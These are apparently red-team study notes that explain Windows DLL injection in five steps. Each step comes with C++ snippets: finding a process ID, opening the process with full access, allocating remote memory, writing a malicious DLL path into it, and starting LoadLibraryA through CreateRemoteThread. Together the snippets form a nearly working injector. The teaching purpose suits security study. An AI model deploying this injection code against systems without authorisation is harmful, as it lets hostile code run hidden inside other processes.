---
{"dg-publish":true,"permalink":"/cards/red-team/images/abusing-dl-ls/"}
---

~ [[cards/red-team/images/Abusing Windows Internals\|Abusing Windows Internals]]
### Introduction
---
**DLL injection** is a technique used to run custom code inside the address space of another process by forcing that process to load a **Dynamic Link Library (DLL)** that contains the malicious.
## Steps
---
**Step 1: Locate the Target Process**

- Use Windows API to search for the process name and obtain its PID (Process ID).
- Uses:
  - `CreateToolhelp32Snapshot` - creates a snapshot of the specified processes, threads, modules, or heaps in the system currently running.
	  - `TH32CS_SNAPPROCESS`: Indicates we want a snapshot of all processes.
  - `Process32First` - Retrieves information about the first process in the snapshot created recently -- Acts as a starting point for process enumeration.
  - `Process32Next` -- continues the iteration through the rest of the process in the snapshot.


```cpp
DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (!strcmp(entry.szExeFile, processName)) {
                    return entry.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &entry));
        }
    }
}


DWORD processId = getProcessId(processName); // Stores the enumerated process ID
```

- `entry.szExeFile` holds the name of the current process being checked in the loop.
- `processName` is the process we are looking for.


**Step 2: Open the Target Process**

- Open the process using `OpenProcess` with `PROCESS_ALL_ACCESS`.
    
- This grants full permissions to manipulate memory and create threads.

```cpp
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS,
    FALSE,
    processId
);
```

**Step 3: Allocate Memory for the DLL Path**

Remember: _hProcess_ is the variable that has a handle to the target process.

```cpp
LPVOID dllAllocatedMemory = VirtualAllocEx(
    hProcess,
    NULL,
    strlen(dllLibFullPath),
    MEM_RESERVE | MEM_COMMIT,
    PAGE_EXECUTE_READWRITE
);
```

- Allocate memory in the target process to hold the DLL path string.
    
- Use `VirtualAllocEx` to allocate executable memory.

**Step 4: Write the DLL Path to Allocated Memory**

```cpp
WriteProcessMemory(
    hProcess, // Handle for the target process
    dllAllocatedMemory,// Allocated Memory In Region
    dllLibFullPath, // Path to the malicious DLL
    strlen(dllLibFullPath) + 1,
    NULL
);
```


- Write the DLL file path to the allocated region in the remote process.
    
- Use `WriteProcessMemory`.

**Step 5: Load and Execute the Malicious DLL**

```cpp
LPVOID loadLibrary = (LPVOID) GetProcAddress(
    GetModuleHandle("kernel32.dll"),
    "LoadLibraryA" // API call to import
);
HANDLE remoteThreadHandler = CreateRemoteThread(
    hProcess, // Handle for the target process
    NULL,
    0, // Default size from the executable of the stack
    (LPTHREAD_START_ROUTINE) loadLibrary,
    dllAllocatedMemory, // pointer to the allocated memory region.
    0,
    NULL
);
```


- Get the address of `LoadLibraryA` from kernel32.dll using `GetProcAddress`.
    
- Use `CreateRemoteThread` to create a new thread in the remote process.
    
- Pass the DLL path and execute the thread to load the DLL.

**Note:** as for the process name you need to input what the task manager sees so in our example

![Abusing DLLs.png](/img/user/cards/red-team/images/Abusing%20DLLs.png)
### Conclusion
---
Assuming all prerequisites are met (correct privileges, matching architecture, and a valid DLL), DLL injection involves:

1. Identifying the target process.
    
2. Opening a handle to it with appropriate access rights.
    
3. Allocating memory inside the target process for the DLL path.
    
4. Writing the full path of the malicious DLL into that allocated memory.
    
5. Using `LoadLibrary` via `CreateRemoteThread` to load and execute the DLL in the context of the target process.



